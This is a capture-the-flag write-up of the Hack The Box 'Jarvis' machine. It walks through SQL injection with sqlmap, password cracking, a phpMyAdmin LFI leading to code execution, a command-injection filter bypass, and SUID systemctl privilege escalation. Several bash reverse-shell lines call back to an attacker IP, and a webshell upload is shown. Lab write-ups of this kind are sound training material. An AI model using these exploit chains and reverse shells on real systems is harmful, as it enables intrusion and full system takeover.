## Default Information
IP Address: 10.10.10.143\
OS: Linux

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.143    jarvis.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.10.143 --rate=1000 -e tun0
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-12-16 11:58:23 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.10.10.143                                    
Discovered open port 80/tcp on 10.10.10.143                                    
Discovered open port 64999/tcp on 10.10.10.143 
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 22  | SSH | OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | Open |
| 80  | http | Apache httpd 2.4.25 ((Debian)) | Open |
| 64999  | http | pache httpd 2.4.25 ((Debian)) | Open |

From the nmap scan, we are also able to discover en email ```supersecurehotel@logger.htb```. We will then add this domain to the /etc/hosts file.

```
10.10.10.143    jarvis.htb logger.htb
```
### Gobuster
We will then use Gobuster to find the endpoints that are accessible from http://jarvis.htb:80

```
http://10.10.10.143:80/css                  (Status: 301) [Size: 310] [--> http://10.10.10.143/css/]
http://10.10.10.143:80/fonts                (Status: 301) [Size: 312] [--> http://10.10.10.143/fonts/]
http://10.10.10.143:80/footer.php           (Status: 200) [Size: 2237]
http://10.10.10.143:80/index.php            (Status: 200) [Size: 23628]
http://10.10.10.143:80/images               (Status: 301) [Size: 313] [--> http://10.10.10.143/images/]
http://10.10.10.143:80/index.php            (Status: 200) [Size: 23628]
http://10.10.10.143:80/js                   (Status: 301) [Size: 309] [--> http://10.10.10.143/js/]
http://10.10.10.143:80/nav.php              (Status: 200) [Size: 1333]
http://10.10.10.143:80/phpmyadmin           (Status: 301) [Size: 317] [--> http://10.10.10.143/phpmyadmin/]
http://10.10.10.143:80/room.php             (Status: 302) [Size: 3024] [--> index.php]
```

Next, we will also try to use Gobuster to find the endpoints from http://jarvis.htb:64999. However, this seems to only include an index.html page which does not provide much insights in this case.

```
http://10.10.10.143:64999/index.html           (Status: 200) [Size: 54]
```

### Web-content discovery

Visiting http://jarvis.htb:64999, we realize that we are brought to a page which tells us that we have been banned for 90s. This seems to be an error page hosted on port 64999 that we might get redirected to when we get banned by the main site. 

![Banned on port 64999](https://github.com/joelczk/writeups/blob/main/HTB/Images/Jarvis/banned.png)

Intercepting the request when we http://jarvis.htb:80, we are able to find an IronWAF header. However, I was unable to find any information or software related to IronWAF online. I shall assume that this might be a software used by this machine only. Regardless, this hints that there might be a firewall acting on all the requests passing through the web server.

![IronWAF](https://github.com/joelczk/writeups/blob/main/HTB/Images/Jarvis/ironwaf.png)

Apart from that, visiting http://jarvis.htb:80/phpmyadmin, we are redirected to a publicly accessible phpmyadmin page. However, we would need to obtain the valid credentials to be able to login to this page.

Visiting http://jarvis.htb:80/nav.php, we are able to find another domain ```supersecurehotel.htb```. We will add this domain to our /etc/hosts file. 

```
10.10.10.143    jarvis.htb logger.htb supersecurehotel.htb
```

Visiting http://jarvis.htb:80/room.php, we realize that we are redirected back to the index.php page. However, clicking on 1 of the rooms, we realize that we are redirected to http://jarvis.htb/room.php?cod=1.

Poking around http://jarvis.htb/room.php?cod=1, we realize that if we change the parameter from ```1``` to ```1'``` the image will be missing from the page, which means that the site might possibly be vulnerable to SQL injection.

## Exploit

### SQL Injection
Running an intruder attack on the site, we realize that we will soon be banned by the site which means that the ironWAF firewall that we have seen earlier might possibly have blocked us.

To exploit this sql injection vulnerability, we can still use sqlmap to bypass the Ironwaf. However, we realize that there is only 1 database (```hotel```) on the backend server and under the ```hotel``` database, there is only 1 table named ```room```. Viewing the room table, we realize that it only contains the room information that we see on the website, which isn't of much use to us.

```
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://jarvis.htb/room.php?cod=1" --random-agent --level 1 --risk 1 --dbms mysql --dump
```

Next, we will try to use sqlmap to dumb all the users and passwords using the same firewall evasion technique.

```
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://jarvis.htb/room.php?cod=1" --random-agent --level 1 --risk 1 --dbms mysql --dump --users --passwords
database management system users [1]:                                                                               
[*] 'DBadmin'@'localhost'
[08:00:58] [INFO] fetching database users password hashes
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] n
do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] y
[08:01:14] [INFO] using hash method 'mysql_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 
[08:01:18] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] n
[08:01:22] [INFO] starting dictionary-based cracking (mysql_passwd)
[08:01:22] [INFO] starting 4 processes 
[08:01:25] [INFO] cracked password 'imissyou' for user 'DBadmin'                                                    
database management system users password hashes:                                                                   
[*] DBadmin [1]:
    password hash: *2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
    clear-text password: imissyou
```

### Exploiting LFI in phpmyadmin

Using the credentials that we have obtained earlier, we will try to ssh into port 22. However, we realized that this is not a pair of valid credentials for the SSH server. 

Next, we will try to use the credentials to login to the exposed phpmyadmin page on http://jarvis.htb:80/phpmyadmin. Fortunetaly, we are able to login to the phpmyadmin page and we also realize that we are using version 4.8.0 for the phpmyadmin page.

![phpmyadmin](https://github.com/joelczk/writeups/blob/main/HTB/Images/Jarvis/phpmyadmin.png)

According to [here](https://www.phpmyadmin.net/security/PMASA-2018-4/), we know that the phpmyadmin page is vulnerable to a LFI exploit. 
![LFI in phpmyadmin](https://github.com/joelczk/writeups/blob/main/HTB/Images/Jarvis/lfi.png)


To achieve an rce, we need to first run a malicious query that executes php commands.

![Running malicious sql query](https://github.com/joelczk/writeups/blob/main/HTB/Images/Jarvis/phpcommands.png)

### LFI to RCE

All that is left for us to do is to visit malicious url in the web browser and we will be able to execute the reverse shell payload.

```
http://jarvis.htb/phpmyadmin/index.php?c=%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.6%2F4000%200%3E%261%27&target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_5dfprra3jip9kpqj17f71jcmg356bqvf
```

Next, we will move on to stabilize the reverse shell

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 4000
listening on [any] 4000 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.10.143] 55466
bash: cannot set terminal process group (640): Inappropriate ioctl for device
bash: no job control in this shell
www-data@jarvis:/usr/share/phpmyadmin$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<min$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@jarvis:/usr/share/phpmyadmin$ export TERM=xterm
export TERM=xterm
www-data@jarvis:/usr/share/phpmyadmin$ stty cols 132 rows 34
stty cols 132 rows 34
```

Moving into the home directory, we realize that the user flag is located in the pepper directory, but we lack the permissions to view the file. Hence, we would now have to do some privilege escalation to the pepper user.

### Source code analysis of /var/www/Admin-Utilities/simpler.py
Running the ```sudo -l``` command, we realize that we can execute /var/www/Admin-Utilies/simpler.py with the privileges of the user pepper.

Looking at the source code, we realize that /var/www/Admin-Utilities/simpler.py may be vulnerable to command injection as the user-defined command variable in exec_ping() function is not properly sanitized. 
However, there is a list of forbidden characters that are being defined which we would have to avoid being passed into the command variable.

```
def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)
```

### Exploiting command injection vulnerability

Using a test payload of ```$(4*4)```, we realize that we can bypass all the forbidden characters and cause the command to be executed

```
www-data@jarvis:/var/www/Admin-Utilities$ python3 simpler.py -p
python3 simpler.py -p
***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************

Enter an IP: $(4*4)
$(4*4)
sh: 1: 4*4: not found
Usage: ping [-aAbBdDfhLnOqrRUvV64] [-c count] [-i interval] [-I interface]
            [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos]
            [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option]
            [-w deadline] [-W timeout] [hop1 ...] destination
Usage: ping -6 [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]
             [-l preload] [-m mark] [-M pmtudisc_option]
             [-N nodeinfo_option] [-p pattern] [-Q tclass] [-s packetsize]
             [-S sndbuf] [-t ttl] [-T timestamp_option] [-w deadline]
             [-W timeout] destination
```

However, we realize that we may be unable to put any reverse shell payload into our command injection payload as the required characters are all specified in the forbidden characters in the code. 

Hence, what we will do is to put the reverse shell payload into a script and we will execute the with the command injection vulnerability.

```
www-data@jarvis:/tmp$ echo -e '#!/bin/bash\n\n/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.16.6/3000 0>&1"' > script.sh
www-data@jarvis:/tmp$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************

Enter an IP: $(/tmp/script.sh)
$(/tmp/script.sh)
```
### Obtaining user flag
```
pepper@jarvis:/tmp$ cat /home/pepper/user.txt
cat /home/pepper/user.txt
<Redacted user flag>
```

### Finding for SUID bits

Checking for SUID bits, we realize that /bin/systemctl has the SUID bit set.

```
pepper@jarvis:/tmp$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/bin/fusermount
/bin/mount
/bin/ping
/bin/systemctl
/bin/umount
/bin/su
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/chfn
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

### Exploiting systemctl for privilege escalation
From [GTFO bins](https://gtfobins.github.io/gtfobins/systemctl/), we realize that we can exploit the systemctl command with SUID privileges. We will modify the command to get a reverse shell with root privileges.

To do that, we have to first create a .service file to define the service that we are going to run. (NOTE:somehow this exploit doesn't work on /tmp directory and I can't figure out why)
```
pepper@jarvis:/dev/shm$ cat >exploit.service<<EOF
cat >exploit.service<<EOF
> [Service]
[Service]
> Type=notify
Type=notify
> ExecStart=/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.16.6/8000 0>&1'
ExecStart=/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.16.6/8000 0>&1'
> KillMode=process
KillMode=process
> Restart=on-failure
Restart=on-failure
> RestartSec=42s
RestartSec=42s
> 

> [Install]
[Install]
> WantedBy=multi-user.target
WantedBy=multi-user.target
> EOF
EOF
```

Next, we will have to link the .service file to systemd with the systemctl command and afterwards, all we have to do is to start the service to spawn the reverse shell.

```
pepper@jarvis:/dev/shm$ systemctl link /dev/shm/exploit.service
systemctl link /dev/shm/exploit.service
Created symlink /etc/systemd/system/exploit.service -> /dev/shm/exploit.service.
pepper@jarvis:/dev/shm$ systemctl start exploit.service
systemctl start exploit.service
```

### Obtaining root flag
```
root@jarvis:/# cat /root/root.txt
cat /root/root.txt
<Redacted root flag>
root@jarvis:/# 
```
## Post Exploitation
### Uploading webshell with sqlmap

Firstly, we can use sqlmap to upload the reverse php script to /var/www/html/shell.php

```
sqlmap -u "http://jarvis.htb/room.php?cod=1" --random-agent --level 1 --risk 1 --batch --file-write /home/kali/Desktop/shell.php --file-dest /var/www/html/shell.php
```

Afterwards, all we have to do is to visit http://jarvis.htb/shell.php to spawn the reverse shell.

### Alternative way to obtain flag from command injection

Since we are able to execute simpler.py with the privileges of pepper, we are also able to modify the command injection payload to read the user flag instead of spawning a reverse shell.

```
www-data@jarvis:/tmp$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************

Enter an IP: $(cat /home/pepper/user.txt)
$(cat /home/pepper/user.txt)
ping: <REDACTED USER FLAG>: Temporary failure in name resolution
www-data@jarvis:/tmp$ 
```

### Alternative way of obtaining root flag using systemctl

Another alternative way of obtaining the root flag using systemctl is to just redirect the contents of the /root/root.txt into a file in the /home/pepper directory.

Since the systemctl has SUID bits, systemctl will be executed with root privileges which in turn, allow us to read and redirect the contents of /root/root.txt file into a file in the /home/pepper directory.

To start off, we would have to modify the executed commands to become ```/bin/bash -c "cat /root/root.txt > /home/pepper/flag.txt"```

```
pepper@jarvis:/dev/shm$ cat >exploit7.service<<EOF
cat >exploit7.service<<EOF
> [Service]
> Type=oneshot
> ExecStart=/bin/bash -c "cat /root/root.txt > /home/pepper/flag.txt"
> 
> [Install]
> WantedBy=multi-user.target
> EOF
```

Afterwards, we would have to link the .service file and start the service. Lastly, we would just have to cat the file to read the flag.

```
pepper@jarvis:/dev/shm$ systemctl link /dev/shm/exploit7.service
Created symlink /etc/systemd/system/exploit7.service -> /dev/shm/exploit7.service.
pepper@jarvis:/dev/shm$ systemctl start exploit7
systemctl start exploit7
pepper@jarvis:/dev/shm$ ls /home/pepper
ls /home/pepper
Web  flag.txt  user.txt
pepper@jarvis:/dev/shm$ cat /home/pepper/flag.txt
cat /home/pepper/flag.txt
<Redacted root flag>
pepper@jarvis:/dev/shm$ 
```
